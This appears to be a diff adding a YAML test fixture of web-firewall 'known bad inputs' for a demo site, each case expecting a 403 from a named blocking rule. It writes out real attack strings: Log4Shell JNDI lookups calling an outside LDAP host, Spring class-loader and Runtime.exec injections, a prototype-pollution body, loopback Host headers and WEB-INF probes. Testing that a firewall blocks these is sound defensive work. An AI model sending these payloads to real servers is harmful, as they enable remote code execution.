@@ -1,0 +1,101 @@
+# Known bad inputs (site demo).
+version: 1
+cases:
+- id: kbi-javadeser-header
+  site: demo
+  request:
+    headers:
+      X-Api: java.lang.Runtime
+  expect:
+    status: 403
+    terminating_rule: JavaDeserializationRCE_HEADER
+- id: kbi-javadeser-body
+  site: demo
+  request:
+    method: POST
+    body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=x
+  expect:
+    status: 403
+    terminating_rule: JavaDeserializationRCE_BODY
+- id: kbi-javadeser-uripath
+  site: demo
+  request:
+    path: /x/java.lang.ProcessBuilder
+  expect:
+    status: 403
+    terminating_rule: JavaDeserializationRCE_URIPATH
+- id: kbi-javadeser-query
+  site: demo
+  request:
+    path: /?a=T(java.lang.Runtime).getRuntime().exec(1)
+  expect:
+    status: 403
+    terminating_rule: JavaDeserializationRCE_QUERYSTRING
+- id: kbi-host-localhost
+  site: demo
+  request:
+    host: localhost
+  expect:
+    status: 403
+    terminating_rule: Host_localhost_HEADER
+- id: kbi-host-loopback-v4
+  site: demo
+  request:
+    host: 127.0.0.1:8080
+  expect:
+    status: 403
+    terminating_rule: Host_localhost_HEADER
+- id: kbi-propfind
+  site: demo
+  request:
+    method: PROPFIND
+  expect:
+    status: 403
+    terminating_rule: PROPFIND_METHOD
+- id: kbi-exploitable-path
+  site: demo
+  request:
+    path: /app/WEB-INF/web.xml
+  expect:
+    status: 403
+    terminating_rule: ExploitablePaths_URIPATH
+- id: kbi-log4j-header
+  site: demo
+  request:
+    headers:
+      X-Api-Version: ${jndi:ldap://e.com/a}
+  expect:
+    status: 403
+    terminating_rule: Log4JRCE_HEADER
+- id: kbi-log4j-query
+  site: demo
+  request:
+    path: /?x=${jndi:ldap://e.com/a}
+  expect:
+    status: 403
+    terminating_rule: Log4JRCE_QUERYSTRING
+- id: kbi-log4j-body
+  site: demo
+  request:
+    method: POST
+    body: x=${jndi:ldap://e.com/a}
+  expect:
+    status: 403
+    terminating_rule: Log4JRCE_BODY
+- id: kbi-log4j-uripath
+  site: demo
+  request:
+    path: /$%7Bjndi:ldap://e.com/a%7D
+  expect:
+    status: 403
+    terminating_rule: Log4JRCE_URIPATH
+- id: kbi-reactjs-body
+  site: demo
+  request:
+    method: POST
+    headers:
+      Next-Action: x
+    body: '{"then":"$1:__proto__:then"}'
+  expect:
+    status: 403
+    terminating_rule: ReactJSRCE_BODY
